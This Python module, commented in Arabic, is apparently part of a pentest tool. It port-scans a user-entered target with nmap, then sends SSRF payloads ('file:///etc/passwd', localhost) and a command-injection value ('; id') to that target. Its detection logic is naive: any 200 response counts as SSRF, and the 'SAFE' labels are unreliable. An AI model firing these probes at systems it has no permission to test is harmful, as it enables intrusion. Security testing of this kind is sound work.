import nmap
import requests
import os
from rich.console import Console
from rich.table import Table

console = Console()

class ServerScanner:
    def __init__(self, target):
        self.target = target  # يمكن أن يكون IP أو Domain
        self.nm = nmap.PortScanner()
        self.open_ports = []

    def scan_ports(self):
        """فحص البورتات المفتوحة باستخدام Nmap"""
        console.print(f"[bold blue][*][/bold blue] Scanning Ports for: [bold cyan]{self.target}[/bold cyan]...")
        try:
            # الفحص لأشهر البورتات (80, 443, 8080, 22)
            self.nm.scan(self.target, '22-443,8080')
            for proto in self.nm[self.target].all_protocols():
                lport = self.nm[self.target][proto].keys()
                for port in lport:
                    state = self.nm[self.target][proto][port]['state']
                    if state == 'open':
                        self.open_ports.append(port)
            
            console.print(f"[bold green][+][/bold green] Open Ports Found: {self.open_ports}")
            return self.open_ports
        except Exception as e:
            console.print(f"[bold red][!] Nmap Error: {e}[/bold red]")
            return []

    def check_ssrf(self):
        """اختبار بسيط لثغرة SSRF على السيرفر المستهدف"""
        console.print("[bold blue][*][/bold blue] Testing for SSRF vulnerabilities...")
        # البايلود يحاول الوصول لملف محلي أو لوكال هوست
        payloads = ["http://127.0.0.1:80", "file:///etc/passwd"]
        vulnerable = False
        
        for p in payloads:
            try:
                # نفترض أن السيرفر لديه باراميتر يسمى 'url' أو 'path'
                r = requests.get(f"http://{self.target}/?url={p}", timeout=3)
                if r.status_code == 200 and len(r.content) > 0:
                    console.print(f"[bold red][!] Possible SSRF found with payload: {p}[/bold red]")
                    vulnerable = True
            except:
                continue
        return vulnerable

    def check_rce(self):
        """اختبار بسيط لثغرة RCE (Remote Code Execution)"""
        console.print("[bold blue][*][/bold blue] Testing for RCE (Remote Code Execution)...")
        # بايلود يحاول تنفيذ أمر 'id'
        payload = "; id"
        try:
            r = requests.get(f"http://{self.target}/?cmd={payload}", timeout=3)
            if "uid=" in r.text:
                console.print(f"[bold red][!] RCE confirmed on {self.target}![/bold red]")
                return True
        except:
            pass
        return False

def run_server_module():
    """الدالة التي سيتم استدعاؤها من main.py"""
    target = console.input("[bold yellow]Enter Target IP/Domain: [/bold yellow]")
    scanner = ServerScanner(target)
    
    # تنفيذ الفحص
    ports = scanner.scan_ports()
    ssrf_status = scanner.check_ssrf()
    rce_status = scanner.check_rce()
    
    # عرض النتائج في جدول مرتب
    table = Table(title="Server Scan Results")
    table.add_column("Service", style="cyan")
    table.add_column("Status", style="magenta")
    
    table.add_row("Open Ports", str(ports))
    table.add_row("SSRF Vulnerability", "[red]VULNERABLE[/red]" if ssrf_status else "[green]SAFE[/green]")
    table.add_row("RCE Vulnerability", "[red]VULNERABLE[/red]" if rce_status else "[green]SAFE[/green]")
    
    console.print(table)
    return {"target": target, "ports": ports, "ssrf": ssrf_status, "rce": rce_status}

if __name__ == "__main__":
    run_server_module()
